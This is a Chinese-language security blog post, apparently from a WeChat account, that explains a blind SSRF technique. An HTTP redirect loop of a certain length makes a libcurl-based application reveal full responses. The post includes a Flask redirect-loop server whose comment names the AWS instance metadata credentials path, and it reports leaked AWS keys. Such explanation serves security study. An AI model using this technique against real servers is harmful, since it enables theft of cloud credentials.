---
title: 一种利用 HTTP 重定向循环的新型 SSRF 技术
url: https://mp.weixin.qq.com/s/GwlZy-KB9epxVtt_-S8fmw
source: Doonsec's feed
date: 2026-01-27
fetch_date: 2026-01-28T03:33:14.481636
---

# 一种利用 HTTP 重定向循环的新型 SSRF 技术

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOIyaiaXvJyFria6AATGkib3eHSsibjWJsesBlfKKJ7khfVyBQtTs4icn3ym07RA09ddxoLrEDuSm7dCBwA/0?wx_fmt=jpeg)

# 一种利用 HTTP 重定向循环的新型 SSRF 技术

原创

Pwn1
Pwn1

漏洞集萃

![]()

在小说阅读器中沉浸阅读

> **免责声明**
> 本公众号所发布的文章内容仅供学习与交流使用，禁止用于任何非法用途。

**原文参考**：Searchlight Cyber - *Novel SSRF Technique Involving HTTP Redirect Loops*

*![如何获得印度最大股票经纪公司的AWS凭证-安全KER - 安全资讯平台](https://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOIyaiaXvJyFria6AATGkib3eHSRuukLzwC9fEKic63DwvnzicnmRuxzccSJDHt91lv10F1ahuzaYPkmtnw/640?wx_fmt=png&from=appmsg)*

在 Web 安全中，服务端请求伪造（SSRF）是一个常见且好用的漏洞。但是在实际渗透测试或红队行动中，我们经常遇到一种很恶心的情况：**Blind SSRF**。

此时虽然服务端发起了请求，但由于应用逻辑对响应格式的严格校验或者是对回显的屏蔽，攻击者无法直接读取敏感数据（如云主机元数据）。

近期，Searchlight Cyber 的研究团队公开了一种利用 **HTTP 重定向循环（Redirect Loops）** 来绕过应用回显限制的创新技巧。本文将对该技术进行详细解读，分析其背后的逻辑漏洞与利用方式。（各位大佬请坐～）

---

## 漏洞场景

研究人员在测试某企业级软件时，发现了一个基于 `libcurl`（C++环境）构建的 SSRF 漏洞。虽然可以控制服务器发起请求，但利用过程存在着下述限制：

1. **强制 JSON 解析**：目标应用预期外部请求返回的是 JSON 格式数据。
2. **异常处理屏蔽**：如果返回的数据不是 JSON（例如 AWS 元数据服务返回的是纯文本或 XML），那么应用就会抛出“无效 JSON”的异常，并且不显示任何响应内容（但是我们需要的就是显示这些内容）。
3. **线索**：研究人员发现，当服务端返回 HTTP 500 错误时，应用会将完整的 HTTP 响应体回显出来（估计是为了方便进行调试所以把响应给打了出来）。

**问题**：

我们一般想要的肯定是云元数据，比如AWS Credentials这些。而这些又是返回的XML之类，很显然 并不是json。这就导致不报错，返回非json不显示，但是报错了显示回应，但是报错的500信息，谁要啊（排除探测端口等这种）

## 突破

通常情况下，在测试 SSRF 的重定向绕过的时候，我们一般只关注“是否跟随重定向”。

但该Searchlight Cyber团队提出了一个更细致的维度：**重定向的次数与状态码的组合**。

他们推测，应用在处理 HTTP 请求时，可能存在三种逻辑分支：

1. **正常/少量重定向**：请求成功，尝试解析 JSON -> 解析失败 -> 吞掉回显。
2. **超过最大重定向次数**：触发 `libcurl` 的 `CURLE_TOO_MANY_REDIRECTS` 错误 -> 抛出网络异常 -> 吞掉回显。
3. **“中间态”异常**：介于上述两者之间，应用可能进入未定义的错误处理逻辑。

正是这个“中间态”，成为了突破口。

## 攻击

为了验证这个猜想，研究人员搭建了一个恶意的 Flask 服务器，用于精细控制重定向的逻辑。

### 核心逻辑

攻击者构造了一个特殊的 URL，指向恶意服务器。该服务器并不立即跳转到最终目标（如 `169.254.169.254`），而是先在内部进行“原地跳转”。

```
@app.route('/redir', methods=['GET', 'POST'])
def redir():
    """Handle redirects with loop counter - after 10 redirects, go to final SSRF location."""
    # Get the current redirect count from query parameter, default to 0
    redirect_count = int(request.args.get('count', 0))

    # Increment the counter
    redirect_count += 1
    status_code = 301 + redirect_count
    # If we've reached 10 redirects, redirect to our desired location
    # To grab AWS metadata keys, you would hit http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name-here
    if redirect_count >= 10:
        return redirect("http://example.com", code=302)
    print("trying: " + str(status_code))
    # Otherwise, redirect back to /redir with incremented counter
    return redirect(f"/redir?count={redirect_count}", code=status_code)

@app.route('/start', methods=['POST', 'GET'])
def start():
    """Starting point for redirect loop."""
    return redirect("/redir", code=302)
```

上述的代码执行重定向循环，每次后续请求都会递增 HTTP 状态码。

那么当利用 SSRF 漏洞指向包含上述逻辑的 URL 的事后，应用程序会返回完整的 HTTP 重定向链和响应：

```
HTTP/1.1 305 USE PROXY
Date: Sun, 01 Jun 2025 02:43:18 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 215
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: /redir?count=4

HTTP/1.1 306 SWITCH PROXY
Date: Sun, 01 Jun 2025 02:43:18 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 215
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: /redir?count=5

HTTP/1.1 307 TEMPORARY REDIRECT
Date: Sun, 01 Jun 2025 02:43:19 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 215
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: /redir?count=6

HTTP/1.1 308 PERMANENT REDIRECT
Date: Sun, 01 Jun 2025 02:43:19 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 215
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: /redir?count=7

HTTP/1.1 309 UNKNOWN
Date: Sun, 01 Jun 2025 02:43:20 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 215
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: /redir?count=8

HTTP/1.1 310 UNKNOWN
Date: Sun, 01 Jun 2025 02:43:20 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 215
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: /redir?count=9

HTTP/1.1 302 FOUND
Date: Sun, 01 Jun 2025 02:43:21 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 225
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: https://example.com

HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Type: text/html
ETag: "84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"
Last-Modified: Mon, 13 Jan 2025 20:11:20 GMT
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 648
Cache-Control: max-age=1824
Date: Sun, 01 Jun 2025 02:43:21 GMT
Alt-Svc: h3=":443"; ma=93600,h3-29=":443"; ma=93600,quic=":443"; ma=93600; v="43"
Connection: keep-alive

<!doctype html>

... omitted for brevity ... (full response)
```

### 关键发现

通过 Fuzzing（模糊测试）不同的重定向次数，Searchlight Cyber 成员发现了如下现象：

* **重定向 1-2 次**：应用提示 `Invalid JSON`，无回显。
* **重定向 > 30 次**：应用提示 `Network Error`，无回显。
* **重定向 5-10 次（特定区间）**：发生了一些意想之外的信息。

在5-10 次这个特定的重定向次数区间内，应用既没有成功进入 JSON 解析流程，也没有触发底层的最大重定向次数超过报错。

相反的呢，它触发了一个通用的错误处理机制（可能是为了调试复杂的网络链路），该机制直接打印了**最后一次请求的完整响应内容**。

通过这种方式，攻击者成功诱导应用泄露了 AWS 的 Access Key 和 Secret Key。

## 原理分析

这本质上是**应用层逻辑与底层库（libcurl）交互时的状态机缺陷**。

（类似于不同架构数据传递导致的漏洞）

1. **Libcurl的层面**：

1. 底层库实现的时候非常忠实地执行了多次跳转，最终获取了元数据。

2. **应用包装层**：

* a、开发者编写代码时，通常只考虑了“成功（200 OK & JSON）”和“彻底失败（超时/断网）”这两种情况。
* b、而当重定向链条变得复杂（比如本次案例中经历了多次 301/302 混合跳转）时，应用内部的某个状态标志位可能发生了错乱，或者说是进入了开发者预留的 `catch-all` 异常块。
* c、那么对于这个开发者没有预料到的异常块中，就成了攻击的口子

觉得本文内容对您有启发或帮助？
点个**关注➕**，获取更多深度分析与前沿资讯！

👉 往期精选

[攻防演练中的“降维打击”：逃逸出内网边界的影子资产与SaaS供应链挖掘](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247484699&idx=1&sn=9455a5c988e2a477fec61e266b526aac&scene=21#wechat_redirect)

[【实战】利用 Salesforce ID 格式特性实现用户遍历](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247484848&idx=1&sn=514665a8b9e06b5f30ca1ef9584b640e&scene=21#wechat_redirect)

[API 渗透实战：从 JSON 响应倒推隐藏的高危路由](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247484828&idx=1&sn=376a99fecd6210283cc43c2a79633b26&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOLRgzxswNMosdb4HdiarwSPg43TDHTKMwbX8kaRZ8iajLgxTBVuwFBynCicFAmAvfvapPCydNnZKwgpw/0?wx_fmt=png)

漏洞集萃

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOLRgzxswNMosdb4HdiarwSPg43TDHTKMwbX8kaRZ8iajLgxTBVuwFBynCicFAmAvfvapPCydNnZKwgpw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过